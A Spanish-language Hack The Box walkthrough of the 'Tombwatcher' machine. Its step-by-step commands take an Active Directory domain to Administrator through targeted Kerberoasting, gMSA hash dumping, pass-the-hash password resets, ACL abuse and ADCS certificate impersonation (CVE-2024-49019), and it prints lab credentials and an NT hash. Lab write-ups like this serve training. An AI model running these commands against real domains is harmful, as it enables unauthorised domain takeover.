---
tags:
title: Tombwatcher - Medium (HTB)
permalink: /Tombwatcher-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento 

```bash
nmap -sS -p- --open --min-rate 5000 -n -Pn 10.10.11.72 -oG allPorts
```

## Credenciales iniciales de la maquina.

`henry:H3nry_987TGV!`

---
Vemos que por smb no podemos enumerar nada entonces ya que tenemos credenciales pasamos a la enumeracion via `Bloodhound`, y para evitar errores solicitamos un TGT.

`impacket-getTGT 'tombwatcher.htb/henry:H3nry_987TGV!' -dc-ip 10.10.11.72`

```bash 
> bloodhound-python -c All -dc tombwatcher.htb -u 'henry' -p ':H3nry_987TGV!`' -d tombwatcher.htb -ns 10.10.11.72
```

Al ver por `Bloodhound` que *`Henry`* posee permisos `WriteSPN` spobre el user *`Alfred`*, por lo que pasamos a explotarlo con la herramienta `[[targetedKerberoast.py]]` para dumpear un hash Kerberos

```bash
> python3 targetedKerberoast.py -v -u 'henry' -p 'H3nry_987TGV!' -d 'tombwatcher.htb' --dc-host 'dc01.tombwatcher.htb'
```

![image-center](/assets/images/Pasted image 20250719035513.png)


Lo crackeamos con `JohnTheRipper`. 

```bash 
> john hash -w=/usr/share/wordlists/rockyou.txt
```

Y conseguimos las siguientes credenciales:

`Alfred:basketball`

---

Si seguimos enumerando por `Bloodhound` vemos que *`Alfred`* tiene la posibilidad de añadirse al grupo `INFRASTRUCTURE`, para eso usamos `BloodyAD` y que a su vez este grupo tiene el permiso `ReadGMSAPassword` sobre *`ansible_dev$`*. 

`impacket-getTGT 'tombwatcher.htb/Alfred:basketball' -dc-ip 10.10.11.72`

```bash 
> bloodyAD -u 'Alfred' -p 'basketball' --dc-ip 10.10.11.72 -d tombwatcher.htb add groupMember 'INFRASTRUCTURE' 'Alfred'
```

```bash
> python3 gMSADumper.py -u Alfred -p basketball -d tombwatcher.htb
```

![image-center](/assets/images/Pasted image 20250719041427.png)

Obtenemos un hash NetNTLMv2 del usuario *`ansible_dev$`*, donde si no tenemos éxito al intentar loguearnos vía [[EvilWinRM]], así que siguiendo enumerando vemos que este `user` posee permisos `ForceChangePassword` sobre el usuario *`Sam`* y que a su vez *`Sam`* tiene los permisos `WriteOwner` sobre el usuario *`John`* por lo que después podemos intentar un forzado de cambio de su password. 

`ansible_dev$:<hash>`

# User Flag 

Le cambiamos el password a *`Sam`*.

```bash 
> pth-net rpc password "sam" "newP@ssword2022" -U
"tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"7bc5a56af89da4d3c03bc048055350f2" -S "10.10.11.72"
```

Reescribimos como propietario de *`John`* a *`Sam`*.
```bash 
> impacket-owneredit -action write -new-owner 'sam' -target 'john' tombwatcher.htb/sam:newP@ssword2022
```

Nos seteamos los permisos `GenericAll` sobre *`John`*.
```bash 
> bloodyAD -u 'sam' -p 'newP@ssword2022' --host 10.10.11.72 -d tombwatcher.htb add genericAll 'john' 'sam'
```

Forzamos un cambio de contraseña sobre *`John`*
```bash 
> bloodyAD -u 'sam' -p 'newP@ssword2022' --host 10.10.11.72 -d tombwatcher.htb set password 'john' 'Lalahola23'
```

Nos loguemos via [[EvilWinRM]]
```bash 
> evil-winrm -i tombwatcher.htb -u john -p Lalahola23
```

---

# Root Flag

Una vez dentro de la maquina vemos que enumerando las rutas no hay nada interesante asi que otra de las opciones es ver si hay algun objeto o `user` eliminado del dominio.

```bash 
> Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects
```

![image-center](/assets/images/Pasted image 20250719234052.png)


Vemos que esta el usuario *`cert_admin`* eliminado del dominio y con su nombre podemos intuir que la escalada puede tratarse de algun certificado o plantilla vulnerable, pero primero debemos restaurar y habilitar al usuario y como no conocemos su `password` debemos setearlo una nueva.

Reestablecemos al usuario *`cert_admin`*.
```bash 
> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```
 
Habilitamos al user.

```bash
> Enable-ADAccount -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

Y le configuramos una nueva Contraseña.

```bash 
> Set-ADAccountPassword -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf -Reset -NewPassword (ConvertTo-SecureString "Lalahola23!$" -AsPlainText -Force)
```

Ahora una vez que completamos todos los pasos pasamos a enumerar con la herramienta [[certipy]] si el dominio posee alguna vulnerabilidad con respecto a las plantilla o certificados.

```bash 
> certipy-ad find -u cert_admin -p 'Lalahola23!$' -dc-host tombwatcher.htb -target 10.10.11.72 -dc-ip 10.10.11.72 -vulnerable
```

Viendo el contenido del archivo txt que nos descargo la herramienta, vemos que es vulnerable al `CVE-2024-49019` la cual basicamente permite a un atacante inyectar politicas de aplicacion (Policy Application) en un certificado a partir de la emision de un plantilla de certificado de la `Version 1 (Schema V1)`, donde como primer paso (en nuestro ejemplo) deberiamos solicitar un certificado V1 "WebServer" el cual no deberia aceptar este tipo de solicitud sino una de tipo `"Server Authentication (EKU)"`.

Primero solicitamos el certificado como el usuario *`Administrator`*.

```bash 
> certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'Lalahola23!$' -dc-ip '10.10.11.72' -target-ip '10.10.11.72' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication' 
```

Y luego nos autenticamos con el como el usario *`Administrator`* y con una shell `ldap` le cambiamos la contraseña para luego loguearnos.

```bash 
> certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -domain tombwatcher.htb -ldap-shell
```

```css 
> change_password Administrator Lalahola23!$$
```

Nos logueamos via `EvilWinRM`.

```bash 
> evil-winrm -i tombwatcher.htb -u administrator -p 'Lalahola23!$$'
```

```bash 
type ../Desktop/root.txt
```

`~Happy Hacking.`





